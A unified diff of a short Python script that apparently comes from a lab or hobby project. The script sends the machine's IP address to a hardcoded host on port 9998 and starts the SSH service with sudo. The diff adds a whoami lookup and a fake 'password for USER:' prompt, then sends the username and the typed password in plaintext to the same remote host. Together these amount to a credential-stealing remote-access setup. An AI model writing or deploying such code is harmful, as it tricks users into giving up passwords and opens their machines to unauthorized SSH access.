@@ -1,33 +1,56 @@
 import socket
 import subprocess
 from subprocess import PIPE
-
+import getpass
 
 def getIP():
 	try:
-	    res = subprocess.check_output('ifconfig')
+	    res1 = subprocess.check_output('ifconfig')
 	except:
 	    print("Error.")
 
-	return str(res).split("eth0:")[1].split("inet ")[1].split(" ")[0]
+	return res1.decode("utf-8").split("eth0:")[1].split("inet ")[1].split(" ")[0]
 
+def getUSER():
+	try:
+	    res2 = subprocess.check_output('whoami')
+	except:
+	    print("Error.")
+
+	return res2.decode("utf-8").strip()
+
+
+def getPASS(USER):
+	PASS = getpass.getpass(prompt="password for " + USER + ": ")
+	return PASS.strip()
 
 
 def getIPandsendIP():
+	#host's IP
 	HOST = '192.168.127.130'
-	PORT = 9998
-
+	PORT =9998
 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	client.connect((HOST, PORT))
 
 	client.send(getIP().encode("utf-8"))
-	response = client.recv(4096)
-	print(response.decode('utf-8'))
+	response1 = client.recv(4096)
+	
+
+	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	client.connect((HOST, PORT))
+	client.send(getUSER().encode("utf-8"))
+	response2 = client.recv(4096)
+	
+	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	client.connect((HOST, PORT))
+	PASS=getPASS(getUSER())
+	client.send(PASS.encode("utf-8"))
+	response3 = client.recv(4096)
 
 	client.close()
 
 def buildSSH():
-	res = subprocess.run("sudo systemctl start ssh", shell=True, stdout=PIPE, stderr=PIPE, text=True)
+	res4 = subprocess.run("sudo systemctl start ssh", shell=True, stdout=PIPE, stderr=PIPE, text=True)
 
 
 if __name__=="__main__":
